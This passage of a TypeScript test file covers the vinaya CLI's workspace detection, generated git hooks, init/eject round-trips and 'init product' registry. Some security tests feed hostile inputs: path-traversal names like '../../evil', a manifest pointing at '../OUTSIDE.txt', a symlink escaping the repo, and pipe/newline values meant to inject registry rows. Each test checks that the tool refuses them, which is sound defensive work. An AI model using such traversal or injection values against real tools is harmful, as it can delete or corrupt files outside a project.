    rmSync(join(root, 'apps/cli'), { recursive: true, force: true })
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/c*l*i*x*y*z*w*v*q"] }\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('refuses a segment with more stars than the bound allows', () => {
    // Deliberately behavioural rather than timed. A wall-clock assertion here
    // passed with the bound disabled — 8 stars against a 37-char name is only
    // ~69ms unguarded, well under any threshold loose enough to survive a
    // loaded runner. This pair discriminates on the bound itself: same
    // directory, same match, one star either side of MAX_SEGMENT_STARS.
    const vendor = () => {
      mkdirSync(join(root, 'apps/aaaaab'), { recursive: true })
      writeFileSync(join(root, 'apps/aaaaab/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    }

    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/a*a*a*a*a*b"] }\n') // 5
    vendor()
    expect(detectVendoredVinaya(root)).toBeNull()

    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/a*a*a*a*b"] }\n') // 4
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/aaaaab', bin: 'apps/aaaaab/dist/index.js' })
  })

  it('refuses a literal workspace segment that symlinks outside the repo', () => {
    // The `..` rule is textual and cannot see this: `vendored` is a clean
    // relative path. The wildcard route is already safe (Dirent.isDirectory()
    // is false for a symlink); this is the literal route.
    const outside = join(root, '..', `outside-${Date.now()}`)
    mkdirSync(outside, { recursive: true })
    writeFileSync(join(outside, 'package.json'), '{ "name": "@attalabs/vinaya" }\n')
    try {
      symlinkSync(outside, join(root, 'vendored'))
      writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["vendored"] }\n')
      expect(detectVendoredVinaya(root)).toBeNull()
    } finally {
      rmSync(outside, { recursive: true, force: true })
    }
  })

  it('still accepts the ordinary paths the guard must not break', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["packages/*"] }\n')
    mkdirSync(join(root, 'packages/vinaya-cli.v2'), { recursive: true })
    writeFileSync(
      join(root, 'packages/vinaya-cli.v2/package.json'),
      '{ "name": "@attalabs/vinaya", "bin": "./dist/index.js" }\n'
    )
    expect(detectVendoredVinaya(root)).toEqual({
      dir: 'packages/vinaya-cli.v2',
      bin: 'packages/vinaya-cli.v2/dist/index.js'
    })
  })
})

// atta-labs/attalabs#935. #929 fixed the four generated WORKFLOWS and left the two
// hook emitters on the published `npx @attalabs/vinaya@<version>` spec — which
// in a vendoring repo resolves to that repo's own unbuilt member and blocks
// every commit and push with `sh: vinaya: command not found`. Both shapes are
// asserted here for the same reason the workflow block asserts both: a test
// that only pinned the published string was pinning the defect.
describe('generated git hooks: published vs vendored invocation (atta-labs/attalabs#935)', () => {
  const VENDORED: VendoredVinaya = { dir: 'apps/cli', bin: 'apps/cli/dist/index.js' }

  function hookBodies(selfHost: VendoredVinaya | null): string[] {
    return buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost })
      .filter((op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path))
      .map((op) => (op.kind === 'managed-block' ? op.body : ''))
  }

  it('vendored repo: both hooks run the built bin, never npx', () => {
    const bodies = hookBodies(VENDORED)
    expect(bodies.length).toBe(2)
    for (const body of bodies) {
      expect(body).toContain(`node ${VENDORED.bin} check`)
      // The generated comment names `npx` to explain why it isn't used; what
      // must be absent is an npx INVOCATION.
      expect(body).not.toContain('npx --yes')
      expect(body).toContain('--local')
    }
    // The two hooks keep their distinct scopes: staged diff vs whole branch.
    expect(bodies.filter((b) => b.includes('--diff-only')).length).toBe(1)
  })

  it('vendored repo: a missing build fails the hook loudly — never a silent skip', () => {
    // `dist/` is generated and git-ignored, so it is legitimately absent in a
    // fresh clone and in every new worktree. Skipping the checks there would
    // turn a loud breakage into an absent ring 0, with nothing saying so.
    for (const body of hookBodies(VENDORED)) {
      expect(body).toContain(`if [ ! -f ${VENDORED.bin} ]`)
      expect(body).toContain(`bun run --cwd ${VENDORED.dir} build`)
      expect(body).toContain('exit 1')
    }
  })

  it('ordinary adopter: byte-for-byte the published shape, with no build guard', () => {
    // The constraint #929 established for workflows, applied here: an adopter
    // with no local copy must not pay for a problem they do not have.
    for (const body of hookBodies(null)) {
      expect(body).toContain('npx --yes @attalabs/vinaya@')
      expect(body).not.toContain('node ')
      expect(body).not.toContain('if [ ! -f')
    }
  })
})

describe('round-trip: init then eject returns the repo to pre-init state', () => {
  it('clean fixture: filesystem is identical before init and after eject', async () => {
    const before = snapshot(root)
    await runInit(['--yes'], makeDeps())
    expect(snapshot(root)).not.toEqual(before) // init changed things
    const out = await captureStdout(() => runEject(['--yes'], ejectDeps()))
    expect(snapshot(root)).toEqual(before) // eject restored exactly
    // labels reported for manual removal, never auto-deleted
    expect(out).toContain('gh label delete vinaya/tier:0')
  })

  it('fixture with adopter lines in a hook: eject strips only the vinaya block', async () => {
    mkdirSync(join(root, '.husky'), { recursive: true })
    writeFileSync(join(root, '.husky/pre-commit'), '#!/usr/bin/env sh\nnpm run lint\n')
    const before = snapshot(root)

    await runInit(['--yes'], makeDeps())
    await runEject(['--yes'], ejectDeps())

    // their hook + line survive; no vinaya block remains
    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(hook).toContain('npm run lint')
    expect(hook).not.toContain('vinaya:managed')
    // everything else restored
    expect(snapshot(root)).toEqual(before)
  })

  it('eject is a no-op on an untouched repo', async () => {
    const before = snapshot(root)
    const rc = await runEject(['--yes'], ejectDeps())
    expect(rc).toBe(0)
    expect(snapshot(root)).toEqual(before)
  })

  it('eject refuses when the manifest is missing/corrupt (never a destructive guess)', async () => {
    // vinaya.config.json present but no `managed` manifest
    writeFileSync(
      join(root, CONFIG_PATH),
      JSON.stringify({ rings: { ring1_forgeWriteInterception: false, ring2_asyncAudits: false } })
    )
    const rc = await runEject(['--yes'], ejectDeps())
    expect(rc).toBe(1)
    // did not delete the file it could not prove ownership of
    expect(existsSync(join(root, CONFIG_PATH))).toBe(true)
  })
})

describe('vinaya init product', () => {
  it('refuses before init, then creates the project:<name> label and a .vinaya/projects.md row after', async () => {
    // before init
    const rcBefore = await runInitProduct(['mobile'], makeDeps())
    expect(rcBefore).toBe(1)

    await runInit(['--yes'], makeDeps())
    const treeAfterInit = snapshot(root)
    createdLabels = [] // isolate what `init product` creates

    const rc = await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    expect(rc).toBe(0)
    // minimal manifest: init product's only forge-reaching op is the
    // project:<name> label — no governance/ files are written.
    expect(createdLabels).toEqual(['project:mobile'])
    expect(existsSync(join(root, 'governance'))).toBe(false)
    // the registry row IS a new local file, so the tree grows by exactly
    // `.vinaya/projects.md` — it is deliberately not tracked in the managed
    // manifest (adopter-declared data, not vinaya-owned scaffolding).
    const treeAfterProduct = snapshot(root)
    const newPaths = [...treeAfterProduct.keys()].filter((p) => !treeAfterInit.has(p))
    expect(newPaths).toEqual(['.vinaya/projects.md'])
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    expect(registry).toContain('| mobile | `apps/mobile` | `apps/mobile/specs/` |')
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.managed.labels).toContain('project:mobile')
    expect(cfg.managed.files).not.toContain('.vinaya/projects.md')
  })

  it('re-running init product for the same name is idempotent (no duplicate row)', async () => {
    await runInit(['--yes'], makeDeps())
    await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    const rc = await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    expect(rc).toBe(0)
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    const rows = registry.split('\n').filter((l) => l.trim().startsWith('| mobile |'))
    expect(rows).toHaveLength(1)
  })

  it('appends a second row for a second product without disturbing the first', async () => {
    await runInit(['--yes'], makeDeps())
    await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    await runInitProduct(['web', '--path', 'apps/web', '--yes'], makeDeps())
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    expect(registry).toContain('| mobile | `apps/mobile` |')
    expect(registry).toContain('| web | `apps/web` |')
  })

  it('rejects a product name with path traversal, creating nothing (security finding 2)', async () => {
    await runInit(['--yes'], makeDeps())
    const before = snapshot(root)
    createdLabels = []
    for (const bad of ['../../evil', 'a/b', '..', 'Mobile', 'has space']) {
      const rc = await runInitProduct([bad, '--yes'], makeDeps())
      expect(rc).toBe(2)
    }
    expect(snapshot(root)).toEqual(before)
    expect(createdLabels).toEqual([]) // no label leaked for a bad name
  })

  it('rejects a --path containing a pipe or newline, writing nothing to the registry (review finding 1)', async () => {
    await runInit(['--yes'], makeDeps())
    const before = snapshot(root)
    createdLabels = []
    for (const bad of ['apps/evil | injected | row', 'apps/evil\nrow']) {
      const rc = await runInitProduct(['mobile', '--path', bad, '--yes'], makeDeps())
      expect(rc).toBe(2)
    }
    expect(snapshot(root)).toEqual(before)
    expect(createdLabels).toEqual([])
  })
})

describe('eject path-traversal safety (security finding 1)', () => {
  it('refuses a hostile manifest (`..` path) and deletes nothing outside the repo', async () => {
    // OUTSIDE.txt lives one dir above the repo root; a hostile manifest tries to reach it.
    const parent = join(tmpdir(), `vinaya-esc-${Date.now()}-${Math.random().toString(36).slice(2)}`)
    mkdirSync(join(parent, 'repo'), { recursive: true })
    const localRoot = join(parent, 'repo')
    const outside = join(parent, 'OUTSIDE.txt')
    writeFileSync(outside, 'must survive')
    // A `..` path fails the schema refinement → readManifest sees it as corrupt → orphan refuse.
    writeFileSync(
      join(localRoot, 'vinaya.config.json'),
      JSON.stringify({ managed: { version: 1, files: ['../OUTSIDE.txt'], blocks: [], labels: [] } })
    )
    const rc = await runEject(['--yes'], {
      detectRepo: async () => ({ repoRoot: localRoot, owner: 'acme', repo: 'widget' }),
      confirm: async () => true
    })
    expect(rc).toBe(1)
    expect(existsSync(outside)).toBe(true) // never deleted
    rmSync(parent, { recursive: true, force: true })
  })
})

describe('partial-failure ownership recording (review finding 3)', () => {
  it('persists the files+blocks manifest before labels, so a label-create failure cannot orphan files', async () => {
    const throwing: LabelGateway = {
      async exists() {
        return false
      },
      async create() {
        throw new Error('gh rate limit')
      }
    }
    let rc = -1
    await captureStdout(async () => {
      rc = await runInit(['--yes'], makeDeps({ labelGateway: () => throwing }))
    })
    // A label-create failure is a warning, not a crash — every other artifact
    // already applied, so the command still finishes with exit 0.
    expect(rc).toBe(0)
    // files were written AND recorded despite the label failure
    expect(existsSync(join(root, CHECKS_WORKFLOW_PATH))).toBe(true)
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.managed.files).toContain(CHECKS_WORKFLOW_PATH)
    // → eject can now clean up (no orphan half-state)
    const before = snapshot(root)
    await runEject(['--yes'], ejectDeps())
    expect(snapshot(root)).not.toEqual(before)
    expect(existsSync(join(root, CHECKS_WORKFLOW_PATH))).toBe(false)
  })

  it('warns with the specific label name and the gateway failure reason, and continues to the next label', async () => {
    const flaky: LabelGateway = {
      async exists() {
        return false
      },
      async create(name) {
        if (name.endsWith('tier:0')) throw new Error('HTTP 404: Not Found')
        createdLabels.push(name)
      }
    }
    const originalWarn = console.warn
    const warnings: string[] = []
    console.warn = ((...args: unknown[]) => {
      warnings.push(args.join(' '))
    }) as typeof console.warn
    let rc = -1
    try {
      await captureStdout(async () => {
        rc = await runInit(['--yes'], makeDeps({ labelGateway: () => flaky }))
      })
    } finally {
      console.warn = originalWarn
    }
    expect(rc).toBe(0)
    expect(warnings.some((w) => w.includes('tier:0') && w.includes('HTTP 404: Not Found'))).toBe(true)
    // every other label still gets created — one failure doesn't stop the loop
    expect(createdLabels.length).toBeGreaterThan(0)
  })
})
